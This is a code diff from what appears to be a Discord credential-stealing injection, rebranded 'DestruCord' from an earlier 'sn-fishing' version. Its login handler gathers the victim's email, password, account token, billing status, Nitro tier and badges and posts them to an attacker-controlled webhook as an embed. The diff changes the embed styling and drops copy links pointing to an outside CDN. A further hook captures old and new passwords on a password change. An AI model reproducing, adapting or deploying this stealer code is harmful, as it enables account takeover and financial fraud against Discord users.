@@ -175,7 +175,7 @@ const getBilling = async (token) => {
       }
     }
   });
-  if (!billing) billing = "\`No payment resource\`";
+  if (!billing) billing = "❌";
   return billing;
 };
 
@@ -241,7 +241,7 @@ const getNitro = (flags) => {
     case 2:
       return "Nitro Boost";
     default:
-      return "\`No Nitro\`";
+      return "No Nitro";
   }
 };
 
@@ -279,10 +279,10 @@ const getBadges = (flags) => {
         badges += "HypeSquad Balance <:BalanceLogo:935184834622554132>"
         break;
     case 0:
-        badges = "\`No Badges\`"
+        badges = ":x:"
         break;
     default:
-        badges = "\`No Badges\`"
+        badges = ":x:"
         break;
 }
   return badges;
@@ -315,63 +315,73 @@ const login = async (email, password, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
-  const friends = await getFriends(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
- embeds: [
+    embeds: [
       {
-        description: `[<:3763verifiedgreen:989343589077221396> **Click Here To Copy Token On Mobile**](https://superfurrycdn.nl/copy/${token})`,
+        title: "DestruCord Login",
+            description: "[<a:blackcap:961249786315538524> │ **Oh you have DestruCorded someone**](https://github.com/KSCHdsc)",
+
             "color": config.embed_color,
             "fields": [
                 {
-                    "name": "<a:sn1:989238042164351006> SN - Token:",
-                    "value": `\`\`\`${token}\`\`\``,
-                    "inline": false
+                    "name": "**Account Name**",
+                    "value": `\`${json.username +"#" + json.discriminator}\``,
+                    "inline": true
                 },
                 {
-                    "name": "<:sn6:989338031179857921> SN - Nitro Type:",
+                    "name": "**Account ID**",
+                    "value": `\`${json.id}\``,
+                    "inline": true
+                },
+                {
+                    "name": "**Nitro:**",
                     "value": `${nitro}`,
                     "inline": true
                 },
                 {
-                    "name": "<a:2788demonshit:989345376567971870> SN - Billing:",
+                    "name": "**Billing:**",
                     "value": `\`${billing}\``,
                     "inline": true
                 },
                 {
-                    "name": "<:sn4:989240048157356062> SN - Badges:",
+                    "name": "**Badges:**",
                     "value": `${badges}`,
-                    "inline": true
+                    "inline": false
                 },
                 {
-                    "name": "<a:sn2:989239408400138310> SN - Email:",
-                    "value": `\`${email}\`\n[Copy Email](https://superfurrycdn.nl/copy/${email})`,
+                    "name": "**Account Email**",
+                    "value": `\`${email}\``,
                     "inline": true
                 }, 
                 {
-                    "name": "<a:sn7:989344653323169802> SN - Password:",
-                    "value": `\`${password}\`\n[Copy Password](https://superfurrycdn.nl/copy/${password})`,
+                    "name": "**Account Password**",
+                    "value": `\`${password}\``,
                     "inline": true
                 },
+                {
+                    "name": "**Token**",
+                    "value": `\`${token}\``,
+                    "inline": false
+                }
             ],
             "author": {
-                "name": json.username +"#" + json.discriminator + " (" + json.id + ") ",
-                icon_url: "https://cdn.discordapp.com/attachments/988813048900907051/989314536152653904/8c97eb5bb60b5e7bae869b44ddad6333.gif"
+                "name": "DestruCord V1"
             },
             "footer": {
-                "text": "sn-fishing.cc",
-                icon_url: "https://cdn.discordapp.com/attachments/988813048900907051/989314536152653904/8c97eb5bb60b5e7bae869b44ddad6333.gif"
+                "text": "©KSCH | https://github.com/KSCHdsc"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
             }
-        },
+      },
     ],
   };
   if (config.ping_on_run) content["content"] = config.ping_val;
   hooker(content);
 };
+
 
 const passwordChanged = async (oldpassword, newpassword, token) => {
   const json = await getInfo(token);
